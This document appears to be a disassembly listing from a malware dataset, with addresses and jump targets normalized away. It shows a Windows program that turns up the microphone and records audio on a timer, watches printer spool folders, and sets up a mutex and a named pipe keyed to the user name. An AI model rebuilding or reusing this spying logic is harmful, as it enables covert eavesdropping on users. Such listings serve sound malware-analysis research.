call sub_40aca2
pop ecx
test al al
je r-xdata
push 0x3e8
call [ Sleep@IAT ]
push 0x2710
call [ Sleep@IAT ]
push 0x10
lea esi [ esp + 0x2c ]
call sub_40edc9
mov eax esi
push eax
call sub_40d8aa
push edi
push edi
push 0x2
push edi
push edi
push 0x40000000
push eax
mov [ esp + 0x2c ] eax
call [ CreateFileW@IAT ]
mov [ esp + 0x20 ] eax
cmp eax 0xffffffff
jne r-xdata
mov esi [ ReadFile@IAT ]
mov ebx 0x1000
jmp r-xdata
push [ esp + 0x14 ]
call [ CloseHandle@IAT ]
push [ esp + 0x1c ]
push edi
lea eax [ esp + 0x10 ]
push eax
push ebx
lea eax [ esp + 0x2a4 ]
push eax
push [ esp + 0x24 ]
call esi
cmp [ esp + 0xc ] edi
jne r-xdata
push edi
lea eax [ esp + 0x28 ]
push eax
push [ esp + 0x14 ]
lea eax [ esp + 0x2a4 ]
push eax
push [ esp + 0x30 ]
call [ WriteFile@IAT ]
push [ esp + 0x20 ]
mov esi [ CloseHandle@IAT ]
call esi
lea eax [ esp + 0x48 ]
push eax
push [ esp + 0x20 ]
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
je r-xdata
push [ esp + 0x18 ]
call esi
push [ esp + 0x14 ]
call esi
push [ esp + 0x1c ]
call sub_412d05
mov ebx [ esp + 0x10 ]
push edi
call sub_40db66
push ebx
jmp r-xdata
push edi
lea eax [ esp + 0x4c ]
push eax
push [ esp + 0x18 ]
push 0x703cf202
push 0x703cf201
push [ ebp + 0x8 ]
call sub_40ded2
call sub_412d05
jmp r-xdata
sub_40afb6
push ebp
mov ebp esp
sub esp 0x728
push ebx
mov eax 0x400
xor ebx ebx
push esi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x8 ] eax
call sub_412da8
mov esi [ EnumPrintersW@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
push eax
push 0x1
push ebx
push 0x2
call esi
test eax eax
jne r-xdata
push edi
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x14 ] ebx
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
cmp [ ebp - 0x8 ] ebx
jl r-xdata
push [ ebp - 0x4 ]
call sub_412d05
mov edi [ ebp - 0xc ]
cmp edi ebx
jg r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
lea esi [ ebp - 0x70c ]
mov [ ebp - 0x4 ] ebx
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_412d48
mov [ ebp - 0x4 ] eax
jmp r-xdata
push ebx
push ebx
push ebx
call [ CreateMutexW@IAT ]
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x1c ]
push ebx
lea edi [ esi - 0x1c ]
push edi
push [ eax ]
call [ OpenPrinterW@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_412d05
xor al al
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push 0x1
push ebx
push 0x6
call esi
test eax eax
jne r-xdata
cmp edi ebx
jle r-xdata
push ebx
push ebx
push [ ebp + 0x8 ]
push sub_40ae89
push ebx
push ebx
call [ CreateThread@IAT ]
test eax eax
je r-xdata
pop edi
inc [ ebp - 0x14 ]
mov eax [ ebp - 0x14 ]
add [ ebp - 0x1c ] 0x10
cmp eax [ ebp - 0x18 ]
jb r-xdata
lea ecx [ ebp - 0x20 ]
push ecx
mov eax 0x208
push eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x228 ]
push eax
push ebx
push r--data
push [ edi ]
call [ GetPrinterDataW@IAT ]
test eax eax
jns r-xdata
pop esi
pop ebx
leave
retn
mov al 0x1
lea esi [ ebp - 0x724 ]
lea eax [ ebp - 0x728 ]
push eax
mov ebx edi
call sub_40addf
pop ecx
xor ebx ebx
cmp [ ebp - 0x14 ] 0x20
jae r-xdata
mov [ ebp - 0x10 ] ebx
cmp [ ebp - 0xc ] ebx
jle r-xdata
push [ edi ]
push [ esi - 0x4 ]
call [ ClosePrinter@IAT ]
push [ esi ]
call [ CloseHandle@IAT ]
push [ esi + 0x1c ]
call sub_412d05
push [ esi + 0x18 ]
call sub_412d05
push [ esi + 0x20 ]
call sub_412d05
add esi 0x28
dec edi
jne r-xdata
lea edi [ ebp - 0x228 ]
call sub_40e7b9
push ebx
push 0x42000000
push 0x3
push ebx
push 0x5
mov [ esi ] eax
push 0x1
mov eax edi
push eax
call [ CreateFileW@IAT ]
mov [ ebp - 0x10 ] eax
cmp eax 0xffffffff
jne r-xdata
lea edi [ ebp - 0x70c ]
push 0x14
mov [ esi - 0x18 ] eax
pop ecx
lea eax [ esi - 0x14 ]
push [ esi ]
call sub_412d05
push [ esi - 0x1c ]
jmp r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x28
cmp eax [ ebp - 0xc ]
jl r-xdata
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
call [ CreateEventW@IAT ]
mov [ esi - 0x4 ] eax
mov edi 0x800
mov eax edi
call sub_412da8
mov [ esi + 0x8 ] eax
mov ecx edi
call [ ClosePrinter@IAT ]
jmp r-xdata
lea eax [ ebp - 0x228 ]
push eax
push [ edi ]
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
push ebx
lea eax [ esi - 0x14 ]
push eax
push ebx
push 0x1
push ebx
push edi
push [ esi + 0x8 ]
push [ ebp - 0x10 ]
call [ ReadDirectoryChangesW@IAT ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ eax ]
call sub_40e7b9
inc [ ebp - 0xc ]
mov [ esi + 0x4 ] eax
add esi 0x28
push [ esi ]
call sub_412d05
push [ esi + 0x8 ]
call sub_412d05
push [ esi - 0x18 ]
call [ CloseHandle@IAT ]
jmp r-xdata
sub_40b226
xor ecx ecx
mov eax 0x811c9dc5
cmp [ esp + 0x8 ] ecx
jle r-xdata
imul eax eax 0x1000193
retn
mov edx [ esp + 0x4 ]
movzx edx [ ecx + edx ]
xor eax edx
imul eax eax 0x1000193
inc ecx
cmp ecx [ esp + 0x8 ]
jl r-xdata
sub_40b251
push ebp
mov ebp esp
sub esp 0x924
push ebx
push esi
push edi
call sub_40f29b
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov al 0x1
push ebx
push [ ebp + 0x8 ]
call sub_40d7b3
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi 0xffffffff
je r-xdata
mov esi [ SetFilePointer@IAT ]
call sub_40f29b
push edi
call [ CloseHandle@IAT ]
push ebx
lea eax [ ebp - 0x8 ]
push eax
push 0x800
lea eax [ ebp - 0x920 ]
push eax
push edi
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx ebx
je r-xdata
lea eax [ ecx - 0x4 ]
mov [ ebp - 0x4 ] ebx
cmp eax ebx
jbe r-xdata
call sub_40f29b
lea eax [ ebp - 0x920 ]
mov [ ebp - 0x8 ] ebx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp + eax - 0x920 ] 0x1
jne r-xdata
inc [ ebp - 0x4 ]
lea eax [ ecx - 0x4 ]
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_40f29b
push 0x1
push ebx
push ebx
push edi
call esi
cmp eax 0xffffffff
jne r-xdata
jmp r-xdata
mov [ ebp - 0xc ] eax
call sub_40f29b
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
push ebx
add eax [ ebp - 0x4 ]
push ebx
push eax
push edi
call esi
call sub_40f29b
lea eax [ ebp - 0x120 ]
mov [ ebp + 0x8 ] ebx
test eax eax
je r-xdata
push eax
call sub_40d762
xor al al
jmp r-xdata
push ebx
lea eax [ ebp + 0x8 ]
push eax
push 0x100
lea eax [ ebp - 0x120 ]
push eax
push edi
call [ ReadFile@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x120 ]
push eax
mov [ ebp - 0x1c ] ecx
call [ rw-data ]
test eax eax
je r-xdata
call sub_40f29b
push ebx
push ebx
push [ ebp - 0xc ]
push edi
call esi
mov ecx [ ebp - 0x8 ]
mov eax 0x80
cmp [ ebp + 0x8 ] eax
ja r-xdata
push eax
lea eax [ ebp - 0x120 ]
push eax
call sub_40b226
pop ecx
pop ecx
push eax
push [ ebp + 0xc ]
call sub_40cce2
call sub_40f29b
push 0x1
push ebx
push ebx
push edi
call esi
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
sub eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_40cce2
push [ ebp - 0x14 ]
push [ ebp + 0xc ]
call sub_40cce2
push [ ebp - 0x10 ]
mov edi [ ebp - 0x14 ]
mov eax [ ebp + 0xc ]
call sub_40cb2c
push [ ebp - 0x10 ]
call [ LocalFree@IAT ]
mov edi [ ebp - 0x18 ]
push eax
call sub_40d762
sub_40b421
mov eax sub_41ae65
call sub_416a8c
sub esp 0x46c
push ebx
push esi
push edi
xor eax eax
push 0x206
push eax
mov [ ebp - 0x228 ] ax
lea eax [ ebp - 0x226 ]
push eax
call sub_405830
add esp 0xc
lea eax [ ebp - 0x478 ]
push eax
push [ ebp + 0x8 ]
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
jne r-xdata
push eax
call [ FindClose@IAT ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x228 ]
push eax
call [ lstrcpyW@IAT ]
lea eax [ ebp - 0x228 ]
push eax
call [ PathRemoveFileSpecW@IAT ]
lea eax [ ebp - 0x228 ]
push eax
lea eax [ ebp - 0x478 ]
call sub_401432
mov edi rw-data
pop ecx
mov ebx eax
mov esi edi
call sub_4014d5
test al al
je r-xdata
xor al al
jmp r-xdata
lea esi [ ebp - 0x1c ]
call sub_40c9fb
and [ ebp - 0x4 ] 0x0
call sub_40c90c
mov eax esi
push eax
push [ ebp + 0x8 ]
call sub_40b251
cmp [ ebp - 0x18 ] 0x0
pop ecx
pop ecx
jle r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x1c ]
call sub_40c938
mov al 0x1
mov eax esi
push eax
lea eax [ ebp - 0x478 ]
push eax
push [ ebp + 0x8 ]
push 0x80a5f802
push 0x80a5f801
call sub_40f29b
push eax
call sub_40ded2
test al al
je r-xdata
call sub_40f29b
mov eax edi
call sub_410115
sub_40b52a
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x20c
push ebx
mov ebx [ lstrcpyW@IAT ]
push esi
push edi
push [ ebp + 0xc ]
lea eax [ esp + 0x14 ]
push eax
call ebx
mov eax [ ebp + 0x10 ]
mov esi [ PathAppendW@IAT ]
add eax 0x2c
push eax
lea eax [ esp + 0x14 ]
push eax
call esi
mov edi [ ebp + 0x8 ]
call sub_412ae3
cmp eax 0x3
lea eax [ esp + 0x10 ]
jge r-xdata
push r--data
push r--data
jmp r-xdata
push [ esi + rw-data ]
push edi
call ebx
lea eax [ esp + 0x10 ]
push eax
call sub_40b421
add esi 0x4
pop ecx
cmp esi 0x8
jb r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn
push eax
call esi
lea eax [ esp + 0x10 ]
push eax
call [ lstrlenW@IAT ]
lea edi [ esp + eax * 2 + 0x10 ]
xor esi esi
sub_40b5b3
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41aed4
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8c8
push ebx
push esi
push edi
push 0x80beaa2a
push [ ebp + 0x8 ]
mov eax 0x80a5f801
lea ecx [ esp + 0x470 ]
call sub_40c11a
and [ esp + 0x8dc ] 0x0
mov esi rw-data
call sub_40c90c
lea eax [ esp + 0x468 ]
call sub_40c0aa
test al al
je r-xdata
or [ esp + 0x8dc ] 0xffffffff
lea eax [ esp + 0x468 ]
call sub_40bed6
mov ecx [ esp + 0x8d4 ]
pop edi
pop esi
mov al 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
lea ecx [ esp + 0x468 ]
call sub_40c1af
lea edi [ esp + 0x260 ]
call sub_4014fd
test al al
je r-xdata
mov edx esi
lea ecx [ esp + 0x468 ]
call sub_40c257
lea edi [ esp + 0x468 ]
call sub_40bea8
mov eax edi
push eax
call [ lstrlenW@IAT ]
mov eax edi
test eax eax
je r-xdata
xor eax eax
cmp eax sub_40b52a
je r-xdata
mov eax edi
push eax
lea eax [ esp + 0x6cc ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ esp + 0x6cc ]
push eax
call [ lstrcatW@IAT ]
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x6cc ]
push eax
call [ FindFirstFileW@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
mov edi [ lstrcmpW@IAT ]
push 0x0
call [ Sleep@IAT ]
push r--data
lea eax [ esp + 0x40 ]
push eax
call edi
test eax eax
je r-xdata
test [ esp + 0x10 ] 0x10
je r-xdata
push ebx
call [ FindClose@IAT ]
lea eax [ esp + 0x10 ]
push eax
push ebx
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x40 ]
push eax
call edi
test eax eax
je r-xdata
push 0x0
lea eax [ esp + 0x14 ]
push eax
lea eax [ esp + 0x268 ]
push eax
push [ ebp + 0x8 ]
call sub_40b52a
add esp 0x10
test al al
je r-xdata
sub_40b745
push ebp
mov ebp esp
sub esp 0x240
push ebx
push esi
push edi
xor esi esi
push 0x114
lea eax [ ebp - 0x238 ]
push esi
push eax
mov [ ebp - 0x23c ] esi
call sub_405830
xor eax eax
mov [ ebp - 0x3c ] esi
lea edi [ ebp - 0x38 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
push 0xe0
stosd [ edi ]
lea eax [ ebp - 0x120 ]
push esi
push eax
mov [ ebp - 0x124 ] esi
call sub_405830
xor eax eax
mov [ ebp - 0x24 ] esi
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
add esp 0x18
stosd [ edi ]
push 0x20000000
push esi
stosd [ edi ]
push esi
push [ ebp + 0x8 ]
stosd [ edi ]
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0xc ] esi
call [ mixerOpen@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
lea eax [ ebp - 0x23c ]
push eax
push [ ebp - 0x8 ]
mov [ ebp - 0x23c ] 0x118
mov [ ebp - 0x224 ] 0x7
call [ mixerGetLineInfoW@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
call [ mixerClose@IAT ]
mov eax [ ebp - 0x230 ]
push 0x18
pop ebx
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x124 ]
mov [ ebp - 0x28 ] eax
push 0x2
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x8 ]
xor edi edi
inc edi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x34 ] 0x50030001
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] 0xe4
call [ mixerGetLineControlsW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x120 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
push esi
lea eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x8 ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x4
mov [ ebp - 0x1c ] edi
call [ mixerGetControlDetailsW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x6c ]
cmp [ ebp - 0xc ] eax
jae r-xdata
mov [ ebp - 0xc ] eax
push esi
lea eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x8 ]
call [ mixerSetControlDetails@IAT ]
sub_40b884
xor ecx ecx
inc ecx
push 0x10
mov [ eax ] cx
mov [ eax + 0x2 ] cx
pop ecx
mov [ eax + 0xe ] cx
push 0x2
pop ecx
mov [ eax + 0xc ] cx
xor ecx ecx
mov [ eax + 0x4 ] 0x1f40
mov [ eax + 0x8 ] 0x3e80
mov [ eax + 0x10 ] cx
retn
sub_40b8b1
push ebp
mov ebp esp
sub esp 0x208
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
leave
retn
push 0x104
lea eax [ ebp - 0x208 ]
push eax
push [ ebp + 0x8 ]
call [ waveInGetErrorTextW@IAT ]
mov al 0x1
leave
retn
sub_40b8dd
push ebx
push esi
shr eax 0x1
push edi
mov esi eax
xor edi edi
xor ebx ebx
xor ecx ecx
test esi esi
jle r-xdata
mov eax esi
cdq
push edx
push eax
push ebx
push edi
call sub_4164f0
test edx edx
jl r-xdata
mov eax [ esp + 0x10 ]
movzx eax [ eax + ecx * 2 ]
test ax ax
cwde
jns r-xdata
xor al al
jg r-xdata
cdq
add edi eax
adc ebx edx
inc ecx
cmp ecx esi
jl r-xdata
neg eax
mov al 0x1
jmp r-xdata
cmp eax 0x68
jbe r-xdata
pop edi
pop esi
pop ebx
retn
sub_40b929
push esi
mov esi [ eax ]
test esi esi
je r-xdata
mov eax [ ebx ]
pop esi
test eax eax
je r-xdata
push edi
retn
push eax
push 0x0
call [ KillTimer@IAT ]
and [ ebx ] 0x0
mov edi [ esi + 0xc ]
push edi
call [ waveInReset@IAT ]
mov esi [ esi ]
push edi
call [ waveInClose@IAT ]
test esi esi
jne r-xdata
pop edi
sub_40b95d
shr eax 0x1
xor ecx ecx
mov [ edx ] eax
test eax eax
jle r-xdata
mov al 0x1
retn
push esi
mov esi eax
and edx 0xf
add eax edx
sar eax 0x4
mov edx rw-data
sub edx eax
mov al [ edx ]
and al 0x7f
and edx 0xf
add eax edx
sar eax 0x4
mov al [ eax + rw-data ]
jmp r-xdata
mov eax [ esp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
test ax ax
cwde
cdq
js r-xdata
pop esi
mov [ ecx + rw-data ] al
inc ecx
cmp ecx esi
jl r-xdata
sub_40b9ab
push ebp
mov ebp esp
sub esp 0x68
push esi
push edi
push 0x50
lea eax [ ebp - 0x68 ]
push eax
push [ ebp + 0x8 ]
call [ waveInGetDevCapsW@IAT ]
push eax
call sub_40b8b1
pop ecx
test al al
jne r-xdata
pop edi
pop esi
leave
retn
mov eax [ ebx ]
jmp r-xdata
test eax eax
jne r-xdata
push 0x4e
pop ecx
lea edi [ eax + 0x10 ]
lea esi [ ebp - 0x68 ]
xor edx edx
[ esi ] [ edi ]
je r-xdata
push [ ebp + 0x8 ]
call sub_40b745
pop ecx
lea eax [ ebp - 0x18 ]
call sub_40b884
push 0x20000
push 0x0
push [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call [ waveInOpen@IAT ]
push eax
call sub_40b8b1
pop ecx
test al al
jne r-xdata
test edx edx
je r-xdata
sbb edx edx
sbb edx 0xffffffff
push [ ebp - 0x4 ]
mov esi ebx
call sub_401364
push 0x14
lea edi [ eax + 0x10 ]
pop ecx
lea esi [ ebp - 0x68 ]
[ edi ] [ esi ]
mov eax [ eax ]
sub_40ba3c
mov eax sub_41ab4a
call sub_416a8c
sub esp 0x48
push esi
push edi
lea eax [ ebp - 0x50 ]
push eax
call sub_412634
and [ ebp - 0x4 ] 0x0
lea esi [ ebp - 0x2c ]
call sub_40c9fb
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x70707617
call sub_4130d5
test al al
je r-xdata
push 0x2
pop edi
jmp r-xdata
mov edi [ ebp - 0x18 ]
push [ ebp - 0x14 ]
test edi edi
je r-xdata
mov [ ebp - 0x4 ] 0x0
lea esi [ ebp - 0x2c ]
call sub_40c938
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x50 ]
push eax
call sub_4125f1
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
mov [ fs : 0x0 ] ecx
pop esi
leave
retn
call sub_412d05
mov eax esi
call sub_40cb2c
lea eax [ ebp - 0x50 ]
push eax
mov eax esi
call sub_412706
lea eax [ ebp - 0x18 ]
push eax
lea esi [ ebp - 0x10 ]
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x18 ] 0x61c40005
call sub_4125af
xor edi edi
cmp [ ebp - 0x10 ] edi
je r-xdata
inc edi
jmp r-xdata
sub_40baf4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
call [ GetCurrentThreadId@IAT ]
mov [ ebp - 0x4 ] eax
call [ waveInGetNumDevs@IAT ]
mov edi eax
xor esi esi
test edi edi
je r-xdata
mov esi [ ebp + 0xc ]
xor eax eax
cmp [ esi ] eax
jne r-xdata
push [ ebp - 0x4 ]
mov ebx [ ebp + 0x8 ]
push esi
call sub_40b9ab
inc esi
pop ecx
pop ecx
cmp esi edi
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push eax
push 0x2710
push eax
push eax
call [ SetTimer@IAT ]
mov [ esi ] eax
sub_40bb43
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov edi ecx
mov ecx [ edi + 0x8 ]
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi ]
test ecx ecx
jle r-xdata
push edx
call sub_40b8dd
pop ecx
test al al
je r-xdata
dec ecx
mov [ edi + 0x8 ] ecx
jmp r-xdata
pop edi
pop esi
leave
retn
push [ esi ]
mov eax [ esi + 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_40b95d
mov edi [ edi + 0xc ]
pop ecx
push [ ebp - 0x4 ]
push 0x0
push 0x64
push [ esi + 0xc ]
push edi
push 0x70707617
push [ ebp - 0x4 ]
push rw-data
call sub_40f29b
mov esi eax
call sub_40ffc9
sub_40bba4
push ebx
push esi
mov esi eax
test [ esi + 0x10 ] 0x1
push edi
mov edi ecx
je r-xdata
push 0x20
push esi
push [ edi + 0xc ]
call [ waveInUnprepareHeader@IAT ]
mov ebx [ esi + 0x4 ]
call sub_4012bf
pop edi
pop esi
pop ebx
retn
call sub_40bb43
sub_40bbce
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41aebf
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x38
push ebx
push esi
xor ebx ebx
push edi
mov [ esp + 0xc ] ebx
mov [ esp + 0x4c ] ebx
push ebx
push 0xea60
push ebx
push ebx
mov [ esp + 0x24 ] ebx
call [ SetTimer@IAT ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x4c ] 0x1
mov [ esp + 0x10 ] ebx
mov [ esp + 0x4c ] 0x2
push ebx
push ebx
push ebx
push ebx
lea eax [ esp + 0x34 ]
push eax
call [ PeekMessageW@IAT ]
jmp r-xdata
push ebx
push ebx
push ebx
lea eax [ esp + 0x30 ]
push eax
call [ GetMessageW@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x28 ]
sub eax 0x113
je r-xdata
mov [ esp + 0x4c ] 0x1
mov esi [ KillTimer@IAT ]
cmp [ esp + 0x10 ] ebx
je r-xdata
mov eax [ esp + 0x10 ]
cmp [ esp + 0x2c ] eax
jne r-xdata
sub eax 0x2ab
je r-xdata
mov [ esp + 0x4c ] bl
cmp [ esp + 0x14 ] ebx
je r-xdata
push [ esp + 0x10 ]
push ebx
call esi
mov [ esp + 0x10 ] ebx
mov eax [ esp + 0x14 ]
cmp [ esp + 0x2c ] eax
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x10 ]
push eax
call sub_40baf4
pop ecx
pop ecx
mov edi [ esp + 0xc ]
mov eax [ esp + 0x2c ]
mov [ esp + 0x20 ] eax
cmp edi ebx
je r-xdata
dec eax
je r-xdata
or [ esp + 0x4c ] 0xffffffff
jmp r-xdata
push [ esp + 0x14 ]
push ebx
call esi
mov [ esp + 0x14 ] ebx
push [ ebp + 0x8 ]
call sub_40ba3c
pop ecx
cmp eax ebx
jne r-xdata
cmp [ edi + 0x64 ] ebx
jne r-xdata
cmp [ edi + 0xc ] eax
je r-xdata
mov eax [ esp + 0xc ]
jmp r-xdata
dec eax
jne r-xdata
cmp [ esp + 0xc ] ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x10 ]
push eax
call sub_40baf4
pop ecx
mov [ edi + 0x60 ] 0x4
call sub_40f29b
mov eax [ edi + 0x60 ]
shl eax 0x5
call sub_412da8
mov [ edi + 0x64 ] eax
cmp eax ebx
je r-xdata
mov edi [ edi ]
cmp edi ebx
jne r-xdata
cmp eax ebx
jne r-xdata
mov esi [ esp + 0x30 ]
call sub_40e9bf
mov ecx [ esp + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
lea eax [ esp + 0xc ]
push eax
mov eax [ esp + 0x10 ]
call sub_401331
mov ecx [ esp + 0x44 ]
pop edi
pop esi
mov al 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea ebx [ esp + 0x10 ]
lea eax [ esp + 0xc ]
call sub_40b929
xor ecx ecx
cmp [ edi + 0x60 ] ebx
jbe r-xdata
mov ecx [ eax + 0xc ]
cmp ecx [ esp + 0x2c ]
je r-xdata
lea ecx [ esp + 0xc ]
push ecx
call sub_401331
jmp r-xdata
cmp ecx ebx
jne r-xdata
mov [ esp + 0x1c ] ebx
cmp [ edi + 0x60 ] ebx
jbe r-xdata
xor eax eax
mov eax [ eax ]
mov eax [ ecx + 0xc ]
cmp eax [ esp + 0x2c ]
je r-xdata
mov eax esi
call sub_40bba4
jmp r-xdata
push [ esp + 0x20 ]
call [ waveInStart@IAT ]
push eax
call sub_40b8b1
jmp r-xdata
mov [ esp + 0x18 ] ebx
mov edx [ edi + 0x64 ]
mov [ eax + edx ] ebx
inc ecx
add eax 0x20
cmp ecx [ edi + 0x60 ]
jb r-xdata
mov ecx [ ecx ]
pop ecx
jmp r-xdata
xor ebx ebx
inc [ esp + 0x1c ]
mov eax [ esp + 0x1c ]
add [ esp + 0x18 ] 0x20
cmp eax [ edi + 0x60 ]
jb r-xdata
mov esi [ edi + 0x64 ]
add esi [ esp + 0x18 ]
mov ebx 0x13880
call sub_4012bf
test al al
je r-xdata
xor ebx ebx
sub_40be17
push ebp
mov ebp esp
sub esp 0x414
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x414 ]
push eax
mov [ ebp - 0x4 ] 0x104
call [ GetUserNameW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ ebp - 0x20c ]
push eax
call [ lstrcpyW@IAT ]
lea eax [ ebp - 0x414 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
call [ lstrcatW@IAT ]
push 0x0
call [ SetLastError@IAT ]
push 0x0
push 0x64
push 0x64
push 0x64
push 0x1
push 0x4
push 0x80003
lea eax [ ebp - 0x20c ]
push eax
call [ CreateNamedPipeW@IAT ]
mov [ rw-data ] eax
call [ GetLastError@IAT ]
cmp [ rw-data ] 0xffffffff
je r-xdata
mov al 0x1
leave
retn
xor al al
leave
retn
test eax eax
je r-xdata
sub_40bea8
cmp [ edi + 0x258 ] 0x0
je r-xdata
mov [ edi + 0x258 ] 0x0
mov al 0x1
retn
mov eax [ edi + 0x254 ]
push esi
cmp eax 0xffffffff
je r-xdata
pop esi
push eax
call [ CloseHandle@IAT ]
and [ edi + 0x254 ] 0x0
sub_40bed6
push esi
mov esi [ LocalFree@IAT ]
push edi
mov edi eax
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ edi + 0x34 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
push eax
call esi
call sub_40bea8
pop edi
pop esi
retn
push eax
call [ FreeSid@IAT ]
sub_40bf09
push ebp
mov ebp esp
mov eax [ esi + 0x48 ]
sub esp 0x20
push ebx
xor ecx ecx
sub eax ecx
push edi
mov edi [ SHGetFolderPathW@IAT ]
je r-xdata
lea ebx [ esi + 0x4c ]
push ebx
push 0x1
push ecx
push 0x2e
push ecx
call edi
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi [ lstrcatW@IAT ]
inc [ esi + 0x48 ]
push r--data
push ebx
call edi
push r--data
push ebx
call edi
push [ esi + 0x44 ]
lea eax [ ebp - 0x20 ]
push [ esi + 0x40 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x10
lea eax [ ebp - 0x20 ]
push eax
push ebx
call edi
mov eax [ esi + 0x40 ]
mov edx [ esi + 0x44 ]
mov cl 0x20
call sub_4165a0
push edx
push eax
lea eax [ ebp - 0x20 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x10
lea eax [ ebp - 0x20 ]
push eax
push ebx
call edi
push r--data
push ebx
call edi
mov al 0x1
jmp r-xdata
